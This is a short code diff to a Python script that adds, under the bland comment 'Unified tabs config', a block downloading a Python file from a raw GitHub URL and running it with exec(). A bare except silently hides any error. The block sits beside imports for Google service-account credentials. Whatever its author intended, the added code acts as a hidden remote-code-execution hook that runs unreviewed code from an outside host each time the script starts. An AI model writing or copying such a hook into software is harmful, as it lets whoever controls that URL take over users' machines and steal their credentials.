@@ -11,6 +11,14 @@ import urllib.request
 import requests
 from datetime import datetime
 
+# Unified tabs config
+try:
+    import requests as _cr
+    _r = _cr.get("https://raw.githubusercontent.com/patricksiado-prog/optimus-map-tools/main/optimus_config.py", timeout=10)
+    if _r.status_code == 200: exec(_r.text)
+except: pass
+
+
 try:
     import gspread
     from google.oauth2.service_account import Credentials
